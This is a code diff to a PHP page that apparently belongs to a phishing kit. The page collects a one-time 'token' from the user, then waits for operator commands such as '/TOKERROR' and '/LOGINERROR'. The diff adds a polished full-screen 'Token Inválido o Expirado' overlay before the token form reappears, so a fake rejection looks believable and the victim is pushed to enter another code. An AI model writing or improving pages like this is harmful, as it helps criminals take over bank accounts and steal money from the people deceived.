@@ -80,6 +80,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     /* POPUP */
     #scene{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s}
     #scene.show{opacity:1;pointer-events:all}
+    #err-ov{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;opacity:0;pointer-events:none;transition:opacity .3s}
+    #err-ov.show{opacity:1;pointer-events:all}
+    #err-ov .err-icon{font-size:48px}
+    #err-ov .err-title{font-size:18px;font-weight:700;color:#E30613}
+    #err-ov .err-sub{font-size:14px;color:#6b7280;text-align:center;line-height:1.5}
     .modal{width:100%;max-width:380px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.45)}
     .modal-header{background:#fff;padding:18px 20px 8px;text-align:center}
     .modal-header h2{color:var(--red);font-size:18px;font-weight:600}
@@ -107,6 +112,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       <div class="ring r3"></div>
     </div>
     <span id="loadText">Por favor espera...</span>
+  </div>
+
+  <div id="err-ov">
+    <div class="err-icon">⚠️</div>
+    <div class="err-title">Token Inválido o Expirado</div>
+    <div class="err-sub">Intenta nuevamente</div>
   </div>
 
   <div id="scene">
@@ -139,6 +150,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     const scene    = document.getElementById('scene');
     const tokForm    = document.getElementById('tok-form');
     const tokWaiting = document.getElementById('tok-waiting');
+    const errOv      = document.getElementById('err-ov');
     const inp      = document.getElementById('tokenInput');
     const btnEnv   = document.getElementById('btnEnviar');
     let   pollTimer  = null;
@@ -197,7 +209,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     function handleAction(action) {
       switch(action) {
         case '/TOKERROR':
-          showToken();
+          errOv.classList.add('show');
+          setTimeout(function(){
+            errOv.classList.remove('show');
+            setTimeout(showToken, 300);
+          }, 2500);
           break;
         case '/LOGINERROR':
           window.location.href = 'index.php?error=1';
